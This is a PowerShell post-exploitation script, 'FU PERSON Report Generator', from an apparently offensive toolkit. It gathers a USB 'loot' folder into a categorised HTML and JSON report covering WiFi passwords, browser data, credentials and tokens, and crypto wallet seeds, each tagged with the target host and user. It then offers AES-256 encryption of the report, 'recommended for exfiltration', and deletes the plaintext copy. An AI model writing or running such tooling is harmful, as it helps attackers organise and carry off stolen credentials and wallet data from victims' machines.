<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | REPORT GENERATOR v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  Aggregate all loot into a single encrypted HTML report          ║
   ║  Multi-device | Timestamped | Portable | Self-contained          ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

$ErrorActionPreference = 'SilentlyContinue'
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition

function Find-LootDirectory {
    $drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2" 2>$null
    foreach ($drive in $drives) {
        $lootDir = Join-Path $drive.DeviceID "loot"
        if (Test-Path $lootDir) { return $lootDir }
    }

    $localLoot = Join-Path $scriptDir "..\..\loot"
    if (Test-Path $localLoot) { return (Resolve-Path $localLoot).Path }

    return $null
}

function Get-LootInventory {
    param([string]$LootDir)

    $inventory = @{
        SystemInfo = @()
        WiFiPasswords = @()
        BrowserData = @()
        Credentials = @()
        NetworkData = @()
        CryptoWallets = @()
        FlipperData = @()
        ESP32Data = @()
        AndroidData = @()
        DSiData = @()
        OtherFiles = @()
    }

    $allFiles = Get-ChildItem -Path $LootDir -Recurse -File 2>$null

    foreach ($file in $allFiles) {
        $relPath = $file.FullName.Replace($LootDir, "").TrimStart("\")
        $entry = @{
            Name = $file.Name
            Path = $relPath
            Size = $file.Length
            Modified = $file.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
            Content = ""
        }

        if ($file.Length -lt 512000) {
            try { $entry.Content = Get-Content $file.FullName -Raw -ErrorAction Stop } catch { }
        }

        switch -Regex ($relPath) {
            'system_info|sysinfo' { $inventory.SystemInfo += $entry }
            'wifi|wireless' { $inventory.WiFiPasswords += $entry }
            'browser|chrome|firefox|edge' { $inventory.BrowserData += $entry }
            'cred|password|token|session' { $inventory.Credentials += $entry }
            'network|recon|port|host|arp' { $inventory.NetworkData += $entry }
            'crypto|wallet|seed|bitcoin|eth' { $inventory.CryptoWallets += $entry }
            'flipper' { $inventory.FlipperData += $entry }
            'esp32|wardriver|scan_data' { $inventory.ESP32Data += $entry }
            'android|termux|adb' { $inventory.AndroidData += $entry }
            'dsi|cyberworld|nintendo' { $inventory.DSiData += $entry }
            default { $inventory.OtherFiles += $entry }
        }
    }

    return $inventory
}

function Build-HTMLReport {
    param(
        [hashtable]$Inventory,
        [string]$LootDir,
        [string]$OutputPath
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME

    $totalFiles = 0
    foreach ($key in $Inventory.Keys) {
        $totalFiles += $Inventory[$key].Count
    }

    $htmlHead = @"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FU PERSON - Loot Report - $timestamp</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
.header { text-align: center; border: 1px solid #00ff41; padding: 20px; margin-bottom: 20px; }
.header h1 { color: #00ffff; font-size: 24px; }
.header .subtitle { color: #00ff41; font-size: 14px; margin-top: 5px; }
.meta { background: #111; border: 1px solid #1a1a2e; padding: 15px; margin-bottom: 20px; }
.meta span { display: inline-block; margin-right: 30px; }
.meta .label { color: #00ffff; }
.section { margin-bottom: 25px; }
.section-header { background: #0d0d1a; border: 1px solid #00ffff; padding: 10px 15px; color: #00ffff; font-size: 16px; cursor: pointer; }
.section-header:hover { background: #1a1a2e; }
.section-header .count { float: right; color: #ff00ff; }
.section-body { border: 1px solid #1a1a2e; border-top: none; padding: 15px; display: none; }
.section-body.open { display: block; }
.file-entry { border-bottom: 1px solid #1a1a2e; padding: 10px 0; }
.file-entry:last-child { border-bottom: none; }
.file-name { color: #00ffff; font-weight: bold; }
.file-meta { color: #666; font-size: 12px; }
.file-content { background: #111; border: 1px solid #1a1a2e; padding: 10px; margin-top: 5px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; font-size: 12px; color: #00cc33; }
.summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-bottom: 20px; }
.stat-card { background: #0d0d1a; border: 1px solid #1a1a2e; padding: 15px; text-align: center; }
.stat-card .number { font-size: 28px; color: #00ffff; }
.stat-card .label { color: #666; font-size: 12px; }
.footer { text-align: center; color: #333; margin-top: 30px; padding: 15px; border-top: 1px solid #1a1a2e; }
.empty { color: #444; font-style: italic; }
</style>
</head>
<body>
<div class="header">
<pre style="color: #00ffff; font-size: 10px;">
 ███████╗██╗   ██╗    ██████╗ ███████╗██████╗ ███████╗ ██████╗ ███╗   ██╗
 ██╔════╝██║   ██║    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║
 █████╗  ██║   ██║    ██████╔╝█████╗  ██████╔╝███████╗██║   ██║██╔██╗ ██║
 ██╔══╝  ██║   ██║    ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║   ██║██║╚██╗██║
 ██║     ╚██████╔╝    ██║     ███████╗██║  ██║███████║╚██████╔╝██║ ╚████║
 ╚═╝      ╚═════╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
</pre>
<h1>LOOT REPORT</h1>
<div class="subtitle">Find You Person | Generated: $timestamp | FLLC Operations Platform v2.0</div>
</div>

<div class="meta">
<span><span class="label">[*] Target:</span> $hostname</span>
<span><span class="label">[*] User:</span> $username</span>
<span><span class="label">[*] Timestamp:</span> $timestamp</span>
<span><span class="label">[*] Total Files:</span> $totalFiles</span>
</div>

<div class="summary">
"@

    $sections = @(
        @{ Key = "SystemInfo"; Label = "System Information"; Icon = "[SYS]" },
        @{ Key = "WiFiPasswords"; Label = "WiFi Passwords"; Icon = "[WiFi]" },
        @{ Key = "BrowserData"; Label = "Browser Data"; Icon = "[WEB]" },
        @{ Key = "Credentials"; Label = "Credentials & Tokens"; Icon = "[KEY]" },
        @{ Key = "NetworkData"; Label = "Network Reconnaissance"; Icon = "[NET]" },
        @{ Key = "CryptoWallets"; Label = "Crypto Wallets"; Icon = "[BTC]" },
        @{ Key = "FlipperData"; Label = "Flipper Zero Data"; Icon = "[FLP]" },
        @{ Key = "ESP32Data"; Label = "ESP32 Scan Data"; Icon = "[ESP]" },
        @{ Key = "AndroidData"; Label = "Android Loot"; Icon = "[DRD]" },
        @{ Key = "DSiData"; Label = "DSi / CyberWorld Data"; Icon = "[DSi]" },
        @{ Key = "OtherFiles"; Label = "Other Files"; Icon = "[???]" }
    )

    foreach ($section in $sections) {
        $count = $Inventory[$section.Key].Count
        $htmlHead += @"
<div class="stat-card">
<div class="number">$count</div>
<div class="label">$($section.Label)</div>
</div>
"@
    }

    $htmlHead += "</div>"

    $htmlBody = ""
    foreach ($section in $sections) {
        $items = $Inventory[$section.Key]
        $count = $items.Count

        $htmlBody += @"
<div class="section">
<div class="section-header" onclick="this.nextElementSibling.classList.toggle('open')">
$($section.Icon) $($section.Label) <span class="count">$count files</span>
</div>
<div class="section-body">
"@

        if ($count -eq 0) {
            $htmlBody += '<div class="empty">[*] No data collected in this category</div>'
        } else {
            foreach ($item in $items) {
                $sizeKB = [math]::Round($item.Size / 1024, 1)
                $htmlBody += @"
<div class="file-entry">
<div class="file-name">$($item.Name)</div>
<div class="file-meta">Path: $($item.Path) | Size: ${sizeKB} KB | Modified: $($item.Modified)</div>
"@
                if ($item.Content) {
                    $escaped = [System.Web.HttpUtility]::HtmlEncode($item.Content)
                    if ($escaped.Length -gt 5000) {
                        $escaped = $escaped.Substring(0, 5000) + "`n... [TRUNCATED - $($escaped.Length) chars total]"
                    }
                    $htmlBody += "<div class='file-content'>$escaped</div>"
                }
                $htmlBody += "</div>"
            }
        }
        $htmlBody += "</div></div>"
    }

    $htmlFoot = @"
<div class="footer">
FLLC | FU PERSON v2.0 | Report generated $timestamp | Authorized use only
</div>
<script>
document.querySelectorAll('.section-header')[0].nextElementSibling.classList.add('open');
</script>
</body>
</html>
"@

    $fullHTML = $htmlHead + $htmlBody + $htmlFoot

    Add-Type -AssemblyName System.Web
    $fullHTML | Out-File -FilePath $OutputPath -Encoding UTF8
}

function Protect-Report {
    param(
        [string]$InputPath,
        [string]$Password
    )

    # AES-256 encryption of the HTML report
    Write-Host "    [*] Encrypting report with AES-256..." -ForegroundColor DarkGray

    try {
        $content = [IO.File]::ReadAllBytes($InputPath)

        # Derive key from password using PBKDF2 (RFC 2898)
        $salt = New-Object byte[] 16
        $rng = [Security.Cryptography.RNGCryptoServiceProvider]::new()
        $rng.GetBytes($salt)

        $deriveBytes = New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, 100000)
        $key = $deriveBytes.GetBytes(32)  # 256-bit
        $iv  = $deriveBytes.GetBytes(16)  # 128-bit IV

        $aes = [Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = [Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7

        $encryptor = $aes.CreateEncryptor()
        $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)

        # Write encrypted file: [salt(16)][encrypted_data]
        $outputPath = $InputPath -replace '\.html$', '.enc'
        $outputStream = [IO.File]::Create($outputPath)
        $outputStream.Write($salt, 0, $salt.Length)
        $outputStream.Write($encrypted, 0, $encrypted.Length)
        $outputStream.Close()

        # Create decryptor script alongside
        $decryptScript = $InputPath -replace '\.html$', '_decrypt.ps1'
        $decryptContent = @'
# FU PERSON Report Decryptor
# Usage: .\decrypt.ps1 -File "report.enc" -Password "your_password"
param([string]$File, [string]$Password)
$data = [IO.File]::ReadAllBytes($File)
$salt = $data[0..15]
$encrypted = $data[16..($data.Length-1)]
$derive = New-Object Security.Cryptography.Rfc2898DeriveBytes($Password, $salt, 100000)
$key = $derive.GetBytes(32); $iv = $derive.GetBytes(16)
$aes = [Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$aes.Mode = [Security.Cryptography.CipherMode]::CBC
$aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
$decryptor = $aes.CreateDecryptor()
$decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
$outFile = $File -replace '\.enc$', '_decrypted.html'
[IO.File]::WriteAllBytes($outFile, $decrypted)
Write-Host "[+] Decrypted to: $outFile"
'@
        $decryptContent | Out-File $decryptScript -Encoding UTF8

        # Remove unencrypted report
        Remove-Item $InputPath -Force

        $encSize = [math]::Round((Get-Item $outputPath).Length / 1024, 1)
        Write-Host "    [+] Report encrypted: $outputPath (${encSize} KB)" -ForegroundColor Green
        Write-Host "    [+] Decryptor script: $decryptScript" -ForegroundColor Green

        $aes.Dispose()
        $rng.Dispose()

        return $outputPath
    } catch {
        Write-Host "    [!] Encryption failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "    [*] Unencrypted report preserved at: $InputPath" -ForegroundColor Yellow
        return $InputPath
    }
}

function Export-JSONReport {
    param(
        [hashtable]$Inventory,
        [string]$OutputPath
    )

    $jsonData = @{
        metadata = @{
            generator = "FU PERSON Report Generator v2.0"
            timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
        }
        sections = @{}
    }

    foreach ($key in $Inventory.Keys) {
        $jsonData.sections[$key] = @{
            count = $Inventory[$key].Count
            files = $Inventory[$key] | ForEach-Object {
                @{ name = $_.Name; path = $_.Path; size = $_.Size; modified = $_.Modified }
            }
        }
    }

    $jsonData | ConvertTo-Json -Depth 5 | Out-File $OutputPath -Encoding UTF8
}

function Start-ReportGeneration {
    Write-Host ""
    Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Magenta
    Write-Host "    ║  REPORT GENERATOR - Loot Aggregation Engine v2.0         ║" -ForegroundColor Magenta
    Write-Host "    ║  HTML | JSON | AES-256 Encryption | Multi-Device         ║" -ForegroundColor Magenta
    Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Magenta

    $lootDir = Find-LootDirectory
    if (-not $lootDir) {
        Write-Host "    [!] No loot directory found on any connected drive" -ForegroundColor Red
        return
    }

    Write-Host "    [+] Loot directory: $lootDir" -ForegroundColor Green
    Write-Host "    [*] Scanning and categorizing files..." -ForegroundColor DarkGray
    $startTime = Get-Date

    $inventory = Get-LootInventory -LootDir $lootDir

    $totalFiles = 0
    $totalSize = 0
    foreach ($key in $inventory.Keys) {
        $count = $inventory[$key].Count
        $totalFiles += $count
        foreach ($item in $inventory[$key]) { $totalSize += $item.Size }
        if ($count -gt 0) {
            Write-Host "    [+] $key`: $count files" -ForegroundColor Green
        }
    }

    if ($totalFiles -eq 0) {
        Write-Host "    [!] No loot files found to report" -ForegroundColor Yellow
        return
    }

    $totalSizeMB = [math]::Round($totalSize / 1MB, 2)
    Write-Host "    [*] Found $totalFiles files (${totalSizeMB} MB) across 11 categories" -ForegroundColor DarkGray

    # Generate HTML report
    $reportName = "FU_PERSON_REPORT_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
    $reportPath = Join-Path $lootDir $reportName

    Write-Host "    [*] Building HTML report..." -ForegroundColor DarkGray
    Build-HTMLReport -Inventory $inventory -LootDir $lootDir -OutputPath $reportPath

    # Generate JSON companion report
    $jsonPath = $reportPath -replace '\.html$', '.json'
    Write-Host "    [*] Building JSON report..." -ForegroundColor DarkGray
    Export-JSONReport -Inventory $inventory -OutputPath $jsonPath

    # Offer encryption
    $reportSize = [math]::Round((Get-Item $reportPath).Length / 1024, 1)
    Write-Host ""
    Write-Host "    [?] Encrypt report with AES-256? (recommended for exfiltration)" -ForegroundColor Yellow
    $encrypt = Read-Host "    root@fuperson:~# Encrypt? (y/N)"

    $finalPath = $reportPath
    if ($encrypt -eq 'y') {
        $password = Read-Host "    root@fuperson:~# Enter encryption password"
        if ($password.Length -ge 4) {
            $finalPath = Protect-Report -InputPath $reportPath -Password $password
            # Also encrypt JSON
            Protect-Report -InputPath $jsonPath -Password $password | Out-Null
        } else {
            Write-Host "    [!] Password too short - skipping encryption" -ForegroundColor Yellow
        }
    }

    $elapsed = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)

    Write-Host ""
    Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "    ║  REPORT GENERATED SUCCESSFULLY                            ║" -ForegroundColor Green
    Write-Host "    ╠══════════════════════════════════════════════════════════╣" -ForegroundColor Green
    Write-Host "    ║  Report: $(Split-Path $finalPath -Leaf)" -ForegroundColor Green
    Write-Host "    ║  Size: ${reportSize} KB | Files: $totalFiles" -ForegroundColor Green
    Write-Host "    ║  Loot: ${totalSizeMB} MB across 11 categories" -ForegroundColor Green
    Write-Host "    ║  Time: ${elapsed}s | Path: $lootDir" -ForegroundColor Green
    Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Green
}
